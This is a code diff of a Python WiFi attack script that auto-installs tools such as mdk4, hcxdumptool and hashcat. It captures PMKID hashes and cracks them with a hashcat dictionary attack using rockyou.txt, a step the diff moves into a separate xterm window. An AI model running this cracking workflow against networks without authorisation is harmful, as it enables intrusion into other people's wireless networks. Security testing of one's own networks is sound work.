@@ -64,7 +64,8 @@ def get_colours(text, color):
 
 def menu_panel():
     get_colours(f"\n[{Fore.RED + '!'}{Fore.GREEN + ''}] Usage: sudo python3 " + sys.argv[0] + " -n <Network InterFace> "
-                "-a <parameters>", "green")
+                                                                                              "-a <parameters>",
+                "green")
     get_colours("――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――", 'red')
     print(f"\n{Fore.BLUE + '┃'}  {Fore.MAGENTA + '[-n]'}{Fore.YELLOW + ' Interface in monitor mode'}")
     print("")
@@ -87,18 +88,17 @@ def check_deps():
         exit()
     subprocess.run(["clear"])
     script_banner()
-    program_status = False
     get_colours("\n\n[*] Checking necessary programs...", "blue")
     # Check MDK4
     check_mdk3 = subprocess.run(["which", "mdk4"], capture_output=True, text=True)
-    if "/usr/bin/mdk4" in check_mdk3.stdout or "/usr/sbin/mdk4" in check_mdk3.stdout:
+    if "mdk4" in check_mdk3.stdout:
         get_colours(f"\nMDK4\t\t\t ({Fore.BLUE + 'V'}{Fore.MAGENTA + ')'}", "magenta")
     else:
         get_colours(f"\nMDK4 \t\t ({Fore.RED + 'X'}{Fore.MAGENTA + ')'}", "magenta")
         get_colours("\nInstalling [MDK4]....", "cyan")
-        install_mdk3 = subprocess.run(["sudo", "apt", "install", "mdk4", "-y"], capture_output=True,
-                                            text=True)
-        if "Setting up mdk4" in install_mdk3.stdout:
+        install_mdk4 = subprocess.run(["sudo", "apt", "install", "mdk4", "-y"], capture_output=True,
+                                      text=True)
+        if "Setting up mdk4" in install_mdk4.stdout:
             get_colours("\n[*] MDK4 Installed...", "blue")
         else:
             get_colours(f"\n[!] There was an error installing the necessary program, Please install the following"
@@ -106,9 +106,26 @@ def check_deps():
             print(f"\n{Fore.BLUE + '┃'}  {Fore.YELLOW + ' sudo apt install mdk4'}")
             print(Fore.WHITE)
             exit()
+    # Check Hashcat
+    check_hashcat = subprocess.run(["which", "hashcat"], capture_output=True, text=True)
+    if "hashcat" in check_hashcat.stdout:
+        get_colours(f"\nHashcat\t\t\t ({Fore.BLUE + 'V'}{Fore.MAGENTA + ')'}", "magenta")
+    else:
+        get_colours(f"\nHashcat \t\t ({Fore.RED + 'X'}{Fore.MAGENTA + ')'}", "magenta")
+        get_colours("\nInstalling [Hashcat]....", "cyan")
+        install_hashcat = subprocess.run(["sudo", "apt", "install", "hashcat", "-y"], capture_output=True,
+                                         text=True)
+        if "Setting up Hashcat" in install_hashcat.stdout:
+            get_colours("\n[*] Hashcat Installed...", "blue")
+        else:
+            get_colours(f"\n[!] There was an error installing the necessary program, Please install the following"
+                        f" programs manually: ", 'red')
+            print(f"\n{Fore.BLUE + '┃'}  {Fore.YELLOW + ' sudo apt install hashcat'}")
+            print(Fore.WHITE)
+            exit()
     # Check Mac-Changer
     check_macchanger = subprocess.run(["which", "macchanger"], capture_output=True, text=True)
-    if "/usr/bin/macchanger" in check_macchanger.stdout or "/usr/sbin/macchanger" in check_macchanger.stdout:
+    if "macchanger" in check_macchanger.stdout:
         get_colours(f"\nMacchanger\t\t ({Fore.BLUE + 'V'}{Fore.MAGENTA + ')'}", "magenta")
     else:
         get_colours(f"\nMacchanger \t\t ({Fore.RED + 'X'}{Fore.MAGENTA + ')'}", "magenta")
@@ -125,7 +142,7 @@ def check_deps():
             exit()
     # Check Airmon-Ng
     check_airmon_ng = subprocess.run(["which", "airmon-ng"], capture_output=True, text=True)
-    if "/usr/bin/airmon-ng" in check_airmon_ng.stdout or "/usr/sbin/airmon-ng" in check_airmon_ng.stdout:
+    if "airmon-ng" in check_airmon_ng.stdout:
         get_colours(f"\nAirmon-ng \t\t ({Fore.BLUE + 'V'}{Fore.MAGENTA + ')'}", "magenta")
     else:
         get_colours(f"\nAirmon-ng \t\t ({Fore.RED + 'X'}{Fore.MAGENTA + ')'}", "magenta")
@@ -142,7 +159,7 @@ def check_deps():
             exit()
     # Check hcxdumptool
     check_hcxdumptool = subprocess.run(["which", "hcxdumptool"], capture_output=True, text=True)
-    if "/usr/bin/hcxdumptool" in check_hcxdumptool.stdout or "/usr/sbin/hcxdumptool" in check_hcxdumptool.stdout:
+    if "hcxdumptool" in check_hcxdumptool.stdout:
         get_colours(f"\nhcxdumpTool \t\t ({Fore.BLUE + 'V'}{Fore.MAGENTA + ')'}", "magenta")
     else:
         get_colours(f"\nhcxdumpTool \t\t ({Fore.RED + 'X'}{Fore.MAGENTA + ')'}", "magenta")
@@ -273,11 +290,11 @@ def attack_func(network_interface, attack_mode):
         # subprocess.run(["rm", "Capture_PKMID"])
         time.sleep(2)
         if "PMKID(s) written to myHashes" in get_pkmid_hashes.stdout:
-            get_colours("\nStarting with Brute-Force attack..", "cyan")
-            time.sleep(3)
-            get_colours("", "yellow")
-            subprocess.run(["sudo", "hashcat", "-m", "22000", "-a", "0", "-w", "4", "myHashes_PKMID",
-                            "/usr/share/wordlists/rockyou.txt", "-d", "1", "--force"])
+            subprocess.run(["clear"])
+            get_colours("[*] Starting with Brute-Force attack..".strip(), "blue".strip())
+            os.system(f"xterm -hold -e hashcat -m 22000 -a 0 -w 4 myHashes_PKMID /usr/share/wordlists/rockyou.txt "
+                      f"-d 1 --force &")
+            quit_program()
         else:
             os.system('clear')
             get_colours("\n[-] no hashes captured...", "red")
